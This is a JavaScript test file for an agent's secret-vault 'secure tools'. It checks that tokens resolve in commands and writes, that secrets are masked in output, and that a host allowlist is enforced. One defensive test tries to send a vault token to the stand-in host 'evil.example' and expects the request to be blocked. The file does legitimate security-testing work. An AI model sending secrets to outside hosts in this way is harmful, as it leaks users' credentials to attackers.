import assert from "node:assert/strict";
import test from "node:test";
import { makeCtx, makeState } from "./helpers.js";
import { registerSecureTools } from "../dist/tools.js";

const signal = new AbortController().signal;

function fakeShell() {
  const calls = [];
  return {
    calls,
    resolve(spec) {
      calls.push(spec);
      return spec;
    },
    async execute(spec) {
      return {
        async result() {
          return {
            exitCode: 0,
            signal: null,
            timedOut: false,
            stdout: { text: `out ${spec.command}` },
            stderr: { text: "" },
          };
        },
      };
    },
  };
}

test("secure_run resolves a token in the command and masks output", async () => {
  const shell = fakeShell();
  const ctx = makeCtx({ shell });
  const { state, vault } = await makeState();
  registerSecureTools(ctx, state);
  const token = await vault.store("S3cret99", "SECRET");
  const tool = ctx.registeredTools.get("secure_run");
  assert.ok(tool);

  const result = await tool.execute({ command: `echo password=${token}` }, { signal });
  assert.match(shell.calls[0].command, /password=S3cret99/);
  assert.match(result.stdout, /\{\{SECRET_[a-z2-7]{6}\}\}/);
  assert.equal(result.exitCode, 0);
});

test("secure_write resolves a token in content and does not return it", async () => {
  const writes = [];
  const fs = {
    async resolve(path) {
      return { path };
    },
    async writeText(target, content) {
      writes.push({ target, content });
      return {};
    },
  };
  const ctx = makeCtx({ fs });
  const { state, vault } = await makeState();
  registerSecureTools(ctx, state);
  const token = await vault.store("13800138000", "PHONE");
  const tool = ctx.registeredTools.get("secure_write");
  assert.ok(tool);

  const result = await tool.execute({ path: "out.txt", content: `phone=${token}\n` }, { signal });
  assert.equal(writes[0].content, "phone=13800138000\n");
  assert.equal(result.path, "out.txt");
  assert.equal(result.bytes, Buffer.byteLength("phone=13800138000\n"));
  assert.ok(!JSON.stringify(result).includes("13800138000"));
});

test("secure_request enforces the host allowlist before network access", async () => {
  const ctx = makeCtx();
  const { state, vault } = await makeState({ secureTools: { enabled: true, allowedHosts: ["api.example"] } });
  registerSecureTools(ctx, state);
  const tool = ctx.registeredTools.get("secure_request");
  assert.ok(tool);
  const token = await vault.store("secret", "SECRET");
  const result = await tool.execute({ url: `https://evil.example/${token}` }, { signal });
  assert.match(result.error, /not in secureTools.allowedHosts/);
});

test("secure tools are omitted when disabled", async () => {
  const ctx = makeCtx();
  const { state } = await makeState({ secureTools: { enabled: false } });
  const dispose = registerSecureTools(ctx, state);
  assert.equal(ctx.registeredTools.size, 0);
  dispose();
});
